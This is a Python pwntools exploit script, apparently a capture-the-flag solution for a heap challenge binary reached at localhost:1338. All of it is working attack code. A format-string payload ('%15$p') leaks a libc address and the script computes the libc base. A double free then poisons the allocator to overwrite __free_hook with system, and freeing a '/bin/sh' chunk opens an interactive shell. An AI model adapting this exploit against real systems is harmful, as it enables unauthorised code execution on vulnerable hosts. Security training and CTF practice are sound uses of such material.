#!/usr/bin/env python3

from pwn import *

# context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

binary = "./chall/app"
libc_path = "./chall/libc.so"

elf = ELF(binary)
libc = ELF(libc_path)


gdbscript = """
    b * sim + 35
"""

# b * cancel_allowance + 118
#     b * allocate_allowance + 198

# p = process(binary)
# dbg = gdb.attach(p, gdbscript)
# p = gdb.debug(binary, gdbscript)
p = remote("localhost", 1338)

sla = lambda a, b : p.sendlineafter(a, b)

def alloc(kid, payload):
    sla(b">", b"1")
    sla(b">", kid)
    sla(b">", payload)

def free(kid):
    sla(b">", b"3")
    sla(b">", kid)


# payload = b"%p|" * 8
payload = b"%15$p"
sla(b":", payload)
p.recvuntil(b"Simulator")
leak = int(p.recvline().strip().decode("utf-8"), 16)
log.info(f"leak: {hex(leak)}")

libc.address = leak - 231 - libc.symbols["__libc_start_main"]
log.info(f"libc base: {hex(libc.address)}")

# one_gadget_1 = libc.address + 0x4f2a5
# one_gadget_2 = libc.address + 0x4f302
# one_gadget_3 = libc.address + 0x10a2fc
# log.info(f"one gadget 1: {hex(one_gadget_1)}")
# log.info(f"one gadget 2: {hex(one_gadget_2)}")
# log.info(f"one gadget 3: {hex(one_gadget_2)}")

free_hook = libc.symbols["__free_hook"]
log.info(f"__free_hook: {hex(free_hook)}")

system = libc.symbols["system"]
log.info(f"system: {hex(system)}")

# exploit
alloc(b"0", b"AAAAAAAA")
alloc(b"1", b"BBBBBBBB")
free(b"0")
free(b"1")
free(b"0")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"1")
p.sendafter(b"> ", p64(free_hook))
p.sendline(p.newline)

# alloc(b"1", p64(free_hook))
alloc(b"1", b"h")
alloc(b"2", b"/bin/sh")
alloc(b"1", p64(system))
p.sendline()

free(b"2")

p.interactive()
